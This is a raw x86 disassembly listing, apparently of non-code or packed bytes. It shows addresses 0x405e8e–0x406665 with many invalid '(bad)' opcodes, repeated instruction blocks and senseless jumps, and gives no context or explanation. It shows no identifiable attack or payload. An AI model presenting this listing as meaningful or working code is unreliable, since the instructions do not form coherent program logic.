  405e8e:	add    BYTE PTR [edx+0x5],ah
  405e91:	inc    ebx
  405e92:	add    BYTE PTR [eax+0x78],al
  405e95:	inc    ecx
  405e96:	add    BYTE PTR [eax+0x41],bl
  405e99:	bound  eax,QWORD PTR [ebx+0x57]
  405e9c:	ret    
  405e9d:	dec    edi
  405e9e:	adc    al,0x6e
  405ea0:	bound  esi,QWORD PTR [eax+eiz*2+0x840bcbb]
  405ea7:	(bad)  
  405ea8:	popf   
  405ea9:	(bad)  
  405eaa:	mov    edi,0x66421556
  405eaf:	bound  esi,QWORD PTR [esi]
  405eb1:	push   esi
  405eb2:	sub    eax,0xb68d46b1
  405eb7:	sub    BYTE PTR [eax+0x494005c0],0x40
  405ebe:	test   BYTE PTR [eax],al
  405ec0:	int3   
  405ec1:	bound  eax,QWORD PTR ds:0xcc840f41
  405ec7:	inc    ebx
  405ec8:	add    BYTE PTR [eax+0x0],al
  405ecb:	inc    eax
  405ecc:	inc    eax
  405ecd:	inc    eax
  405ece:	int3   
  405ecf:	add    BYTE PTR ds:0x62404341,al
  405ed5:	pop    eax
  405ed6:	add    BYTE PTR [ebx+0x40],al
  405ed9:	bound  ecx,QWORD PTR [edi]
  405edb:	inc    eax
  405edc:	lock loopne 0x405ecf
  405edf:	adc    ch,ah
  405ee1:	popa   
  405ee2:	nop
  405ee3:	sub    al,0x54
  405ee5:	push   edx
  405ee6:	retf   0x1dbf
  405ee9:	ins    BYTE PTR es:[edi],dx
  405eea:	es or  al,0xd4
  405eed:	cwde   
  405eee:	loopne 0x405f40
  405ef0:	pop    edx
  405ef1:	and    edi,DWORD PTR [esi+0x6224252b]
  405ef7:	add    al,0xf3
  405ef9:	jl     0x405ecc
  405efb:	add    eax,0x4000002c
  405f00:	inc    eax
  405f01:	cmovno eax,DWORD PTR ds:0x40056243
  405f08:	int3   
  405f09:	add    ah,cl
  405f0b:	inc    eax
  405f0c:	inc    eax
  405f0d:	bound  eax,QWORD PTR [ecx+0x0]
  405f10:	add    BYTE PTR [edi],cl
  405f12:	inc    ebx
  405f13:	inc    eax
  405f14:	inc    eax
  405f15:	add    BYTE PTR [ecx+0x43],al
  405f18:	add    eax,0x40256240
  405f1d:	bound  eax,QWORD PTR [eax]
  405f1f:	leave  
  405f20:	jbe    0x405eef
  405f22:	fwait
  405f23:	mov    ds:0x7ca86396,eax
  405f28:	test   BYTE PTR [ecx+0x15],dl
  405f2b:	clc    
  405f2c:	and    edx,DWORD PTR [ebp+0x54]
  405f2f:	push   edx
  405f30:	(bad)  
  405f31:	retf   
  405f32:	inc    eax
  405f33:	arpl   WORD PTR [eax+ebp*1],di
  405f36:	sub    bh,BYTE PTR [esi+0x7a]
  405f39:	dec    eax
  405f3a:	fucomp st(4)
  405f3c:	xchg   ecx,eax
  405f3d:	inc    edi
  405f3e:	inc    eax
  405f3f:	jl     0x405f55
  405f41:	or     eax,0x6153639b
  405f46:	inc    eax
  405f47:	push   0x65
  405f49:	retf   
  405f4a:	(bad)  
  405f4c:	add    eax,0x4140cc00
  405f51:	inc    eax
  405f52:	inc    ebx
  405f53:	bound  esp,QWORD PTR ds:0x41400043
  405f59:	add    BYTE PTR [eax],al
  405f5b:	add    eax,0x43624062
  405f60:	inc    ecx
  405f61:	inc    eax
  405f62:	inc    eax
  405f63:	inc    eax
  405f64:	add    eax,0x40624340
  405f69:	add    eax,0x40664140
  405f6e:	shr    DWORD PTR [eax+0x42730966],1
  405f74:	int3   
  405f75:	bound  ebx,QWORD PTR [bp+si+0x53]
  405f79:	pop    esp
  405f7a:	in     al,0xcb
  405f7c:	push   cs
  405f7d:	pop    edi
  405f7e:	push   ecx
  405f7f:	aaa    
  405f80:	test   al,0x63
  405f82:	or     BYTE PTR [edi+eiz*8-0x55],0x5a
  405f87:	inc    ebx
  405f88:	inc    eax
  405f89:	mov    ebp,0x3f2e1505
  405f8e:	push   edx
  405f8f:	fadd   QWORD PTR [ebx+0x0]
  405f92:	add    eax,0x41107840
  405f97:	bound  eax,QWORD PTR [eax+0x40]
  405f9a:	sldt   WORD PTR [eax-0x34]
  405f9e:	js     0x406002
  405fa0:	add    eax,0x40664143
  405fa5:	inc    ebx
  405fa6:	add    BYTE PTR [ecx+0x5],al
  405fa9:	js     0x405feb
  405fab:	bound  eax,QWORD PTR [eax+0x0]
  405fae:	inc    eax
  405faf:	inc    eax
  405fb0:	cmp    BYTE PTR [edi+0x268730cb],al
  405fb6:	mov    esi,0x4f6d6344
  405fbb:	inc    ebx
  405fbc:	and    al,0x7
  405fbe:	int    0x51
  405fc0:	dec    ecx
  405fc1:	lahf   
  405fc2:	enter  0x25bb,0x30
  405fc6:	test   al,0x4b
  405fc8:	cld    
  405fc9:	ins    DWORD PTR es:[edi],dx
  405fca:	push   eax
  405fcb:	out    0x5e,eax
  405fcd:	std    
  405fce:	adc    cl,al
  405fd0:	inc    eax
  405fd1:	xor    al,0x62
  405fd3:	inc    ebp
  405fd4:	arpl   WORD PTR [eax+0x5c],sp
  405fd7:	aam    0xa8
  405fd9:	bound  edx,QWORD PTR [eax]
  405fdb:	push   edx
  405fdc:	inc    esp
  405fdd:	add    al,BYTE PTR [eax+0x434172fb]
  405fe3:	inc    eax
  405fe4:	inc    eax
  405fe5:	add    eax,0x434162
  405fea:	inc    eax
  405feb:	add    BYTE PTR [edx+0x5],ah
  405fee:	inc    eax
  405fef:	adc    BYTE PTR [edx+0x40],ah
  405ff2:	inc    ebx
  405ff3:	inc    ecx
  405ff4:	add    eax,0x4340
  405ff9:	add    eax,0x404162
  405ffe:	add    BYTE PTR [eax+0x43],al
  406001:	inc    eax
  406002:	add    eax,0x65ca50c5
  406007:	icebp  
  406008:	ret    
  406009:	cmp    BYTE PTR [esi],dh
  40600b:	jo     0x406012
  40600d:	push   esi
  40600e:	aaa    
  40600f:	inc    eax
  406010:	mov    esp,0x6bb14f60
  406015:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  406017:	push   ecx
  406018:	inc    ebp
  406019:	enter  0x6235,0xb3
  40601d:	and    ah,cl
  40601f:	push   0xfffffff0
  406021:	push   esp
  406022:	sbb    BYTE PTR [edx+eiz*2-0x80],al
  406026:	popa   
  406027:	pop    ds
  406028:	inc    esp
  406029:	and    bh,BYTE PTR [edx+0x5e93507c]
  40602f:	ins    DWORD PTR es:[edi],dx
  406030:	bound  ecx,QWORD PTR [eax]
  406032:	(bad)  
  406033:	leave  
  406034:	push   eax
  406035:	inc    ecx
  406036:	popa   
  406037:	push   edi
  406038:	pop    es
  406039:	test   al,0xb0
  40603b:	pop    ebp
  40603c:	inc    eax
  40603d:	add    BYTE PTR [eax],al
  40603f:	inc    ecx
  406040:	inc    ebx
  406041:	add    eax,0x41784062
  406046:	inc    eax
  406047:	inc    eax
  406048:	add    BYTE PTR [edi],cl
  40604a:	bound  eax,QWORD PTR [ebx+0x0]
  40604d:	add    eax,0x25006240
  406052:	inc    eax
  406053:	add    eax,0x40254143
  406058:	add    eax,0x5620000
  40605d:	adc    edx,DWORD PTR [eax]
  40605f:	dec    eax
  406060:	fcom   QWORD PTR [eax]
  406062:	ins    BYTE PTR es:[edi],dx
  406063:	adc    eax,0x9d632487
  406068:	inc    esp
  406069:	clc    
  40606a:	bound  edi,QWORD PTR ds:0x48fff747
  406070:	sub    al,BYTE PTR ds:0x2c35cb85
  406076:	dec    eax
  406077:	lahf   
  406078:	push   cs
  406079:	int    0xc0
  40607b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40607c:	inc    ebx
  40607d:	data16 loope 0x4060c8
  406080:	xor    al,BYTE PTR [ebx+0x5b]
  406083:	in     eax,dx
  406084:	imul   ebx,DWORD PTR ds:[bx-0x383c],0x15
  40608b:	jo     0x4060bd
  40608d:	retf   0x3fe7
  406090:	dec    edi
  406091:	xor    al,0xe4
  406093:	and    BYTE PTR [eax+0x43],al
  406096:	inc    edi
  406097:	dec    eax
  406098:	inc    ebx
  406099:	add    BYTE PTR [eax],al
  40609b:	add    BYTE PTR [ecx+0x40],al
  40609e:	bound  esp,QWORD PTR [esi+0x0]
  4060a1:	inc    eax
  4060a2:	add    eax,0x5400000
  4060a7:	inc    ecx
  4060a8:	inc    eax
  4060a9:	inc    eax
  4060aa:	bound  esp,QWORD PTR ds:0x25050043
  4060b0:	inc    ecx
  4060b1:	inc    ebx
  4060b2:	inc    eax
  4060b3:	test   BYTE PTR [eax+0x0],al
  4060b6:	bound  ebx,QWORD PTR [eax+0x62]
  4060b9:	inc    ecx
  4060ba:	inc    eax
  4060bb:	add    BYTE PTR [ecx+0x64],0x63
  4060bf:	mov    ah,0x55
  4060c1:	es lahf 
  4060c3:	lds    ebp,FWORD PTR [edx]
  4060c5:	imul   ecx,ecx,0x5
  4060c8:	call   0xa840:0xb0414833
  4060cf:	xchg   BYTE PTR [esi+0x3ce9f58],ch
  4060d5:	inc    esp
  4060d6:	or     eax,0x41406210
  4060db:	and    eax,0x40000500
  4060e0:	inc    ebx
  4060e1:	add    eax,0x40624041
  4060e6:	inc    ebx
  4060e7:	add    eax,0x43402541
  4060ec:	bound  eax,QWORD PTR [eax+0x43]
  4060ef:	int3   
  4060f0:	inc    eax
  4060f1:	bound  eax,QWORD PTR [eax]
  4060f3:	inc    ecx
  4060f4:	inc    eax
  4060f5:	inc    eax
  4060f6:	add    eax,0xa3483d05
  4060fb:	dec    eax
  4060fc:	mov    eax,0xb3cb505b
  406101:	lds    esp,FWORD PTR [ecx-0x61]
  406104:	arpl   WORD PTR [edx+0x41],sp
  406107:	inc    ecx
  406108:	add    eax,0xbc68214f
  40610d:	lock cld 
  40610f:	and    eax,DWORD PTR [esi-0x4220ba80]
  406115:	fadd   DWORD PTR [edi+0x58]
  406118:	xor    ebp,DWORD PTR [esi]
  40611a:	and    DWORD PTR [edx+0x40],esp
  40611d:	and    eax,0x5406600
  406122:	inc    ebx
  406123:	inc    ecx
  406124:	inc    eax
  406125:	inc    eax
  406126:	inc    ebx
  406127:	add    BYTE PTR [eax],al
  406129:	add    BYTE PTR [edx-0x34],ah
  40612c:	inc    eax
  40612d:	add    eax,0x40004041
  406132:	inc    ecx
  406133:	int3   
  406134:	add    BYTE PTR [ebx-0x7c],al
  406137:	add    eax,0x5406240
  40613c:	bound  ebp,QWORD PTR [eax-0x58]
  40613f:	add    eax,0xa9b25260
  406144:	push   esp
  406145:	fild   WORD PTR [edi-0x79]
  406148:	adc    ah,al
  40614a:	add    eax,0x2a0a6323
  40614f:	es inc ecx
  406151:	dec    edi
  406152:	xchg   dl,dl
  406154:	scas   eax,DWORD PTR es:[edi]
  406155:	repnz adc DWORD PTR [edx],esi
  406158:	std    
  406159:	inc    eax
  40615a:	add    BYTE PTR gs:[edi+0x6e],ah
  40615e:	pop    esp
  40615f:	call   0x4f202d9
  406164:	es dec ecx
  406166:	add    DWORD PTR ds:0xd205c7e8,0x87c35013
  406170:	inc    ecx
  406171:	fs xchg dl,bl
  406174:	inc    eax
  406175:	bound  ebx,QWORD PTR [eax+0x41]
  406178:	add    eax,0x40404340
  40617d:	inc    ebx
  40617e:	inc    eax
  40617f:	test   BYTE PTR [eax],al
  406181:	add    eax,0x40624041
  406186:	inc    eax
  406187:	add    BYTE PTR [edx+0x5],ah
  40618a:	inc    ebx
  40618b:	add    BYTE PTR [eax+0x78],al
  40618e:	inc    ecx
  40618f:	add    BYTE PTR [eax+0x41],bl
  406192:	bound  ebp,QWORD PTR [edi]
  406194:	mov    ebp,0x1ffd1846
  406199:	cmp    al,0x20
  40619b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40619c:	sub    eax,0x204eaccb
  4061a1:	mov    al,0x4e
  4061a3:	retf   
  4061a4:	inc    ebp
  4061a5:	lods   al,BYTE PTR ds:[esi]
  4061a6:	ret    
  4061a7:	pusha  
  4061a8:	fs add eax,0x62f2e1a6
  4061ae:	inc    ebx
  4061af:	push   esi
  4061b0:	xor    eax,0x6e59df86
  4061b5:	pusha  
  4061b6:	dec    ecx
  4061b7:	jl     0x406161
  4061b9:	daa    
  4061ba:	adc    al,0xe1
  4061bc:	inc    esi
  4061bd:	cmp    esp,0x6a
  4061c0:	inc    ebp
  4061c1:	inc    ebx
  4061c2:	and    BYTE PTR [esi],0xbb
  4061c5:	sbb    eax,0x84405b49
  4061ca:	add    ah,cl
  4061cc:	bound  eax,QWORD PTR ds:0xcc840f41
  4061d2:	inc    ebx
  4061d3:	add    BYTE PTR [eax+0x0],al
  4061d6:	inc    eax
  4061d7:	inc    eax
  4061d8:	inc    eax
  4061d9:	int3   
  4061da:	add    BYTE PTR ds:0x62404341,al
  4061e0:	pop    eax
  4061e1:	add    BYTE PTR [ebx+0x40],al
  4061e4:	bound  ecx,QWORD PTR [edi]
  4061e6:	inc    eax
  4061e7:	sub    al,BYTE PTR [eax+0x1e]
  4061ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061eb:	inc    edx
  4061ec:	push   edx
  4061ed:	nop
  4061ee:	pusha  
  4061ef:	xor    eax,0xb34baa37
  4061f4:	push   cs
  4061f5:	sub    DWORD PTR [ecx+0x18],esi
  4061f8:	sub    BYTE PTR [esi],ah
  4061fa:	loope  0x40623d
  4061fc:	cmp    BYTE PTR [eax+edx*2+0x3ef84a9b],dl
  406203:	push   eax
  406204:	in     al,0x69
  406206:	adc    eax,0x2513c092
  40620b:	xor    ecx,DWORD PTR [esi]
  40620d:	xchg   edx,eax
  40620e:	retf   
  40620f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406210:	or     al,BYTE PTR [eax]
  406212:	add    BYTE PTR [eax+0x40],al
  406215:	cmovno eax,DWORD PTR ds:0x40056243
  40621c:	int3   
  40621d:	add    ah,cl
  40621f:	inc    eax
  406220:	inc    eax
  406221:	bound  eax,QWORD PTR [ecx+0x0]
  406224:	add    BYTE PTR [edi],cl
  406226:	inc    ebx
  406227:	inc    eax
  406228:	inc    eax
  406229:	add    BYTE PTR [ecx+0x43],al
  40622c:	add    eax,0x40256240
  406231:	bound  eax,QWORD PTR [eax]
  406233:	sar    bh,0x41
  406236:	cdq    
  406237:	stos   DWORD PTR es:[edi],eax
  406238:	ins    BYTE PTR es:[edi],dx
  406239:	inc    esi
  40623a:	test   al,0xa1
  40623c:	les    edi,FWORD PTR [ebx]
  40623e:	retf   0xc744
  406241:	jns    0x406255
  406243:	ins    DWORD PTR es:[edi],dx
  406244:	lods   eax,DWORD PTR ds:[esi]
  406245:	sbb    eax,0xdcababb0
  40624a:	dec    eax
  40624b:	adc    eax,0x411242cd
  406250:	mov    al,0x5
  406252:	add    ah,cl
  406254:	inc    eax
  406255:	inc    ecx
  406256:	inc    eax
  406257:	inc    ebx
  406258:	bound  esp,QWORD PTR ds:0x41400043
  40625e:	add    BYTE PTR [eax],al
  406260:	add    eax,0x43624062
  406265:	inc    ecx
  406266:	inc    eax
  406267:	inc    eax
  406268:	inc    eax
  406269:	add    eax,0x40624340
  40626e:	add    eax,0x40664140
  406273:	arpl   WORD PTR [ecx+0x62],ax
  406276:	jecxz  0x406288
  406278:	test   al,0xdb
  40627a:	add    al,0x6
  40627c:	test   BYTE PTR [esp+edx*1],bh
  40627f:	daa    
  406280:	je     0x406246
  406282:	mov    gs,WORD PTR [ecx+0x41e1683c]
  406288:	sub    al,BYTE PTR [edi+0x63]
  40628b:	or     al,0x42
  40628d:	add    eax,0x35407172
  406292:	inc    ebx
  406293:	add    BYTE PTR ds:0x41107840,al
  406299:	bound  eax,QWORD PTR [eax+0x40]
  40629c:	sldt   WORD PTR [eax-0x34]
  4062a0:	js     0x406304
  4062a2:	add    eax,0x40664143
  4062a7:	inc    ebx
  4062a8:	add    BYTE PTR [ecx+0x5],al
  4062ab:	js     0x4062ed
  4062ad:	bound  eax,QWORD PTR [eax+0x0]
  4062b0:	inc    eax
  4062b1:	arpl   WORD PTR [esi+0x20e1af0c],bp
  4062b7:	inc    eax
  4062b8:	inc    ecx
  4062b9:	lods   al,BYTE PTR ds:[esi]
  4062ba:	arpl   bp,cx
  4062bc:	push   eax
  4062bd:	inc    ebx
  4062be:	xchg   ecx,eax
  4062bf:	inc    ecx
  4062c0:	ds pusha 
  4062c2:	dec    ebp
  4062c3:	mov    eax,0xfe10616e
  4062c8:	aad    0x34
  4062ca:	or     BYTE PTR ds:0xa9f27290,al
  4062d0:	inc    esp
  4062d1:	adc    BYTE PTR [ebx+ecx*8+0x42],0x2b
  4062d6:	sub    dh,BYTE PTR [eax+0x516dc57b]
  4062dc:	and    eax,0x48054072
  4062e1:	inc    ecx
  4062e2:	or     BYTE PTR [esp+edi*2+0x3f],al
  4062e6:	das    
  4062e7:	retf   
  4062e8:	inc    ecx
  4062e9:	mov    WORD PTR [edx+0x6a],fs
  4062ec:	mov    DWORD PTR [ecx+0x43],0x62054040
  4062f3:	inc    ecx
  4062f4:	inc    ebx
  4062f5:	add    BYTE PTR [eax+0x0],al
  4062f8:	bound  eax,QWORD PTR ds:0x40621040
  4062fe:	inc    ebx
  4062ff:	inc    ecx
  406300:	add    eax,0x4340
  406305:	add    eax,0x404162
  40630a:	add    BYTE PTR [eax+0x43],al
  40630d:	inc    eax
  40630e:	add    eax,0x8448f844
  406313:	loopne 0x406369
  406315:	pusha  
  406316:	scas   al,BYTE PTR es:[edi]
  406317:	ss dec dx
  40631a:	rcr    BYTE PTR [eax],1
  40631c:	pop    esp
  40631d:	bound  ecx,QWORD PTR [edx-0x41]
  406320:	ror    DWORD PTR [esi+0x63],1
  406323:	call   0x40:0x300ab8c1
  40632a:	add    BYTE PTR [ecx+0x43],al
  40632d:	add    eax,0x41784062
  406332:	inc    eax
  406333:	inc    eax
  406334:	add    BYTE PTR [edi],cl
  406336:	bound  eax,QWORD PTR [ebx+0x0]
  406339:	add    eax,0x25006240
  40633e:	inc    eax
  40633f:	add    eax,0x40254143
  406344:	add    eax,0x44620000
  406349:	fcomp  QWORD PTR [eax-0x3f]
  40634c:	and    al,0x5
  40634e:	push   edx
  40634f:	dec    ebp
  406350:	push   esp
  406351:	imul   ebp,DWORD PTR [edi+0x29],0x5c
  406355:	leave  
  406356:	cwde   
  406357:	mov    eax,ds:0x9481336e
  40635c:	and    DWORD PTR [edx+0x43],ecx
  40635f:	add    al,0x40
  406361:	cmp    al,0x62
  406363:	(bad)  
  406364:	fsubp  st(3),st
  406366:	add    eax,0x2d6a5161
  40636b:	push   es
  40636c:	add    al,0x76
  40636e:	outs   dx,BYTE PTR gs:[esi]
  406370:	inc    edx
  406371:	call   0xa93dffa2
  406376:	shl    BYTE PTR ds:0x7ecdbcf0,1
  40637c:	fs inc ebx
  40637e:	add    BYTE PTR [eax],al
  406380:	add    BYTE PTR [ecx+0x40],al
  406383:	bound  esp,QWORD PTR [esi+0x0]
  406386:	inc    eax
  406387:	add    eax,0x5400000
  40638c:	inc    ecx
  40638d:	inc    eax
  40638e:	inc    eax
  40638f:	bound  esp,QWORD PTR ds:0x25050043
  406395:	inc    ecx
  406396:	inc    ebx
  406397:	inc    eax
  406398:	test   BYTE PTR [eax+0x0],al
  40639b:	bound  ebx,QWORD PTR [eax+0x62]
  40639e:	inc    ecx
  40639f:	inc    eax
  4063a0:	adc    bh,ah
  4063a2:	dec    edi
  4063a3:	outs   dx,DWORD PTR ds:[esi]
  4063a4:	fs jl  0x4063b9
  4063a7:	fst    QWORD PTR [eax-0x56]
  4063aa:	and    eax,0x7d41335c
  4063af:	aam    0x5
  4063b1:	or     eax,DWORD PTR [ecx+0x10]
  4063b4:	fcom   DWORD PTR [ebx+0x6f]
  4063b7:	bound  eax,QWORD PTR [edx-0x31]
  4063ba:	and    DWORD PTR [edx+0x40],edi
  4063bd:	cmp    BYTE PTR [ecx+0x10],bl
  4063c0:	add    DWORD PTR [edi],edx
  4063c2:	sub    bl,BYTE PTR [edx-0x40c37bbc]
  4063c8:	sub    al,0x2e
  4063ca:	loope  0x406414
  4063cc:	adc    ah,0x6b
  4063cf:	adc    BYTE PTR [edx+0x40],ah
  4063d2:	inc    ecx
  4063d3:	and    eax,0x40000500
  4063d8:	inc    ebx
  4063d9:	add    eax,0x40624041
  4063de:	inc    ebx
  4063df:	add    eax,0x43402541
  4063e4:	bound  eax,QWORD PTR [eax+0x43]
  4063e7:	int3   
  4063e8:	inc    eax
  4063e9:	bound  eax,QWORD PTR [eax]
  4063eb:	inc    ecx
  4063ec:	inc    eax
  4063ed:	inc    eax
  4063ee:	add    eax,0xc9d60505
  4063f3:	inc    ebx
  4063f4:	push   eax
  4063f5:	sbb    eax,0xa9cd8765
  4063fa:	jmp    0xe0e59820
  4063ff:	mov    esp,0x3f49bc41
  406404:	inc    edx
  406405:	retf   
  406406:	cmp    al,0x6b
  406408:	jo     0x40647b
  40640a:	adc    DWORD PTR [ebx],ebp
  40640c:	nop
  40640d:	inc    ebx
  40640e:	data16 arpl ax,dx
  406411:	mov    ebx,0xaa2823d1
  406416:	sbb    BYTE PTR [edx+eiz*2],ch
  406419:	ins    BYTE PTR es:[edi],dx
  40641a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40641b:	les    ecx,FWORD PTR [eax]
  40641d:	bound  eax,QWORD PTR [eax+0x25]
  406420:	add    BYTE PTR [esi+0x40],ah
  406423:	add    eax,0x40404143
  406428:	inc    ebx
  406429:	add    BYTE PTR [eax],al
  40642b:	add    BYTE PTR [edx-0x34],ah
  40642e:	inc    eax
  40642f:	add    eax,0x40004041
  406434:	inc    ecx
  406435:	int3   
  406436:	add    BYTE PTR [ebx-0x7c],al
  406439:	add    eax,0x5406240
  40643e:	bound  ebp,QWORD PTR [eax-0x20bfe79b]
  406444:	push   es
  406445:	gs ins DWORD PTR es:[edi],dx
  406447:	adc    ax,cx
  40644a:	inc    eax
  40644b:	xchg   esp,eax
  40644c:	es xor al,0x4c
  40644f:	aas    
  406450:	jge    0x406496
  406452:	inc    ecx
  406453:	push   eax
  406454:	xchg   esp,eax
  406455:	mov    ds:0x3efd2061,eax
  40645a:	loop   0x4064b9
  40645c:	sub    al,0x6d
  40645e:	bound  esp,QWORD PTR [edx+0x7f]
  406461:	jmp    FWORD PTR [ecx-0x1e9e2223]
  406467:	pushf  
  406468:	jo     0x406412
  40646a:	inc    edx
  40646b:	pop    esi
  40646c:	ss pop ebx
  40646e:	dec    ebp
  40646f:	push   ss
  406470:	bound  edx,QWORD PTR [eax]
  406472:	sbb    ecx,esp
  406474:	(bad)  
  406476:	and    DWORD PTR [eax+0x62],eax
  406479:	pop    eax
  40647a:	inc    ecx
  40647b:	add    eax,0x40404340
  406480:	inc    ebx
  406481:	inc    eax
  406482:	test   BYTE PTR [eax],al
  406484:	add    eax,0x40624041
  406489:	inc    eax
  40648a:	add    BYTE PTR [edx+0x5],ah
  40648d:	inc    ebx
  40648e:	add    BYTE PTR [eax+0x78],al
  406491:	inc    ecx
  406492:	add    BYTE PTR [eax+0x41],bl
  406495:	bound  ebp,QWORD PTR [eax+0x17cb043]
  40649b:	leave  
  40649c:	pop    edx
  40649d:	out    dx,eax
  40649e:	inc    eax
  40649f:	and    BYTE PTR ds:0xa151a462,al
  4064a5:	inc    esi
  4064a6:	sub    ch,BYTE PTR [ebx+0x42]
  4064a9:	push   ecx
  4064aa:	push   0xffffffb1
  4064ac:	dec    esi
  4064ad:	and    DWORD PTR [edx+0x28],eax
  4064b0:	push   esi
  4064b1:	fsubr  QWORD PTR [ebx+0x666f614c]
  4064b7:	repnz hlt 
  4064b9:	pop    ebx
  4064ba:	push   0xf4a150be
  4064bf:	test   al,0x6c
  4064c1:	test   BYTE PTR [edx],ah
  4064c3:	stos   DWORD PTR es:[edi],eax
  4064c4:	and    DWORD PTR [edx+0x0],esp
  4064c7:	adc    al,cl
  4064c9:	add    BYTE PTR [ebp+0x40],ah
  4064cc:	test   BYTE PTR [eax],al
  4064ce:	int3   
  4064cf:	bound  eax,QWORD PTR ds:0xcc840f41
  4064d5:	inc    ebx
  4064d6:	add    BYTE PTR [eax+0x0],al
  4064d9:	inc    eax
  4064da:	inc    eax
  4064db:	inc    eax
  4064dc:	int3   
  4064dd:	add    BYTE PTR ds:0x62404341,al
  4064e3:	pop    eax
  4064e4:	add    BYTE PTR [ebx+0x40],al
  4064e7:	bound  ecx,QWORD PTR [edi]
  4064e9:	inc    eax
  4064ea:	mov    esi,0x414d61bf
  4064ef:	add    cl,BYTE PTR [edi]
  4064f1:	(bad)  
  4064f2:	jno    0x406569
  4064f4:	cmp    eax,0xdd046ac5
  4064f9:	add    ch,bl
  4064fb:	mov    eax,ds:0x62d84823
  406500:	push   edx
  406501:	bound  edi,QWORD PTR [ebx+edi*2]
  406504:	xchg   esp,eax
  406505:	inc    edx
  406506:	(bad)  
  406507:	retf   
  406508:	add    BYTE PTR [eax],al
  40650a:	inc    eax
  40650b:	inc    eax
  40650c:	cmovno eax,DWORD PTR ds:0x40056243
  406513:	int3   
  406514:	add    ah,cl
  406516:	inc    eax
  406517:	inc    eax
  406518:	bound  eax,QWORD PTR [ecx+0x0]
  40651b:	add    BYTE PTR [edi],cl
  40651d:	inc    ebx
  40651e:	inc    eax
  40651f:	inc    eax
  406520:	add    BYTE PTR [ecx+0x43],al
  406523:	add    eax,0x40256240
  406528:	bound  eax,QWORD PTR [eax]
  40652a:	shl    BYTE PTR [ebx+0x28],0x65
  40652e:	mov    ds:0x4b404331,eax
  406533:	sub    dl,dl
  406535:	add    bl,dl
  406537:	fwait
  406538:	rcl    BYTE PTR [eax-0x18],0x63
  40653c:	pop    edi
  40653d:	and    esp,edi
  40653f:	lods   al,BYTE PTR ds:[esi]
  406540:	xchg   edx,eax
  406541:	inc    esp
  406542:	ins    BYTE PTR es:[edi],dx
  406543:	jne    0x40650f
  406545:	inc    ebp
  406546:	test   al,0x3
  406548:	cmp    BYTE PTR [esi-0x5c2fd38e],al
  40654e:	popa   
  40654f:	inc    esi
  406550:	leave  
  406551:	inc    edx
  406552:	mov    WORD PTR [esi-0x15],fs
  406555:	dec    esi
  406556:	dec    ebp
  406557:	push   ebx
  406558:	and    BYTE PTR ds:0xa5e9ea64,0xe1
  40655f:	mov    esp,0xc843dc34
  406564:	add    eax,0x4140cc00
  406569:	inc    eax
  40656a:	inc    ebx
  40656b:	bound  esp,QWORD PTR ds:0x41400043
  406571:	add    BYTE PTR [eax],al
  406573:	add    eax,0x43624062
  406578:	inc    ecx
  406579:	inc    eax
  40657a:	inc    eax
  40657b:	inc    eax
  40657c:	add    eax,0x40624340
  406581:	add    eax,0x40664140
  406586:	scas   eax,DWORD PTR es:[edi]
  406587:	push   0xf75b4dbf
  40658c:	and    cl,cl
  40658e:	dec    esp
  40658f:	and    DWORD PTR [ecx+0x31],edx
  406592:	test   eax,0x61366a4f
  406597:	xor    al,0x21
  406599:	sti    
  40659a:	test   al,0x1a
  40659c:	fmul   st,st(1)
  40659e:	aam    0xa1
  4065a0:	dec    eax
  4065a1:	mov    al,ds:0x6e019a11
  4065a6:	fsubr  DWORD PTR ds:0x194852a2
  4065ac:	bound  esp,QWORD PTR [ebx+ecx*2-0x1f]
  4065b0:	cs dec ecx
  4065b2:	inc    edx
  4065b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065b4:	loopne 0x40661a
  4065b6:	push   ecx
  4065b7:	mov    edi,0x5779c047
  4065bc:	jl     0x4065c3
  4065be:	inc    edx
  4065bf:	inc    ebx
  4065c0:	add    BYTE PTR ds:0x41107840,al
  4065c6:	bound  eax,QWORD PTR [eax+0x40]
  4065c9:	sldt   WORD PTR [eax-0x34]
  4065cd:	js     0x406631
  4065cf:	add    eax,0x40664143
  4065d4:	inc    ebx
  4065d5:	add    BYTE PTR [ecx+0x5],al
  4065d8:	js     0x40661a
  4065da:	bound  eax,QWORD PTR [eax+0x0]
  4065dd:	inc    eax
  4065de:	inc    ecx
  4065df:	mov    ds:0x67922c9e,al
  4065e4:	retf   
  4065e5:	in     eax,0xa3
  4065e7:	add    al,0x11
  4065e9:	push   ebx
  4065ea:	and    DWORD PTR [edi+0x60],0x7a
  4065ee:	push   esi
  4065ef:	inc    eax
  4065f0:	test   al,0x35
  4065f2:	pusha  
  4065f3:	nop
  4065f4:	xor    al,0xa7
  4065f6:	arpl   WORD PTR [eax-0x7d],sp
  4065f9:	imul   esp,DWORD PTR [ebx+0x63],0x2c6c30bf
  406600:	cmp    edi,esi
  406602:	neg    DWORD PTR [eax]
  406604:	mov    eax,0x62a1e186
  406609:	bound  ecx,QWORD PTR [edi+0x0]
  40660c:	ret    
  40660d:	inc    ecx
  40660e:	inc    ebx
  40660f:	inc    eax
  406610:	inc    eax
  406611:	add    eax,0x434162
  406616:	inc    eax
  406617:	add    BYTE PTR [edx+0x5],ah
  40661a:	inc    eax
  40661b:	adc    BYTE PTR [edx+0x40],ah
  40661e:	inc    ebx
  40661f:	inc    ecx
  406620:	add    eax,0x4340
  406625:	add    eax,0x404162
  40662a:	add    BYTE PTR [eax+0x43],al
  40662d:	inc    eax
  40662e:	add    eax,0x6b911889
  406633:	imul   esi,DWORD PTR [ecx+0x4f],0x2de5c454
  40663a:	shr    BYTE PTR [edx+eax*2-0x25d27bca],1
  406641:	clc    
  406642:	push   edx
  406643:	arpl   WORD PTR [ebx-0x5c3f3cfd],si
  406649:	jp     0x4065cf
  40664b:	fsub   QWORD PTR [edi-0x58]
  40664e:	inc    eax
  40664f:	add    BYTE PTR [eax],al
  406651:	inc    ecx
  406652:	inc    ebx
  406653:	add    eax,0x41784062
  406658:	inc    eax
  406659:	inc    eax
  40665a:	add    BYTE PTR [edi],cl
  40665c:	bound  eax,QWORD PTR [ebx+0x0]
  40665f:	add    eax,0x25006240
  406664:	inc    eax
  406665:	add    eax,0x40254143
